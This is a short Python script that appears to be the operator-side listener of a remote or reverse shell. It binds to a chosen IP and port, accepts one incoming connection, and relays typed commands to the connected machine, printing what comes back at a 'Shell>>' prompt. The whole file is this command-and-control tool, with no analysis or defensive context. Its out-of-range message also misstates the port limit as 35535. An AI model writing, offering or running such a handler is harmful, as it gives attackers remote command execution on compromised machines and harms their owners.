import socket
import sys

def line():
	print("-"*100)

#server_ip = "192.168.0.241"
#server_port = 5555

server_ip = input("Please enter the Server-IP: ")
server_port = int(input("Please enter the Server-Port: "))

if server_port > 0 and server_port <= 65535:
	s = socket.socket()
	s.bind((server_ip, server_port))
	s.listen(1)
	print("{} listen on Port {} for Connections...".format(server_ip, server_port))
	client_socket, client_address = s.accept()
	print("{} has been established  a Connection...".format(client_address[0]))
	line()
	print("Shell>> ", end="")
	while True:
		command = input()
		if command == "exit":
			client_socket.close()
			s.close()
			sys.exit()
		if len(command) > 0:
			client_socket.send(command.encode())
			data = client_socket.recv(8192)
			print(data.decode("utf-8"), end="")
else:
	print("The Server-Port is out of range (0-35535)!")


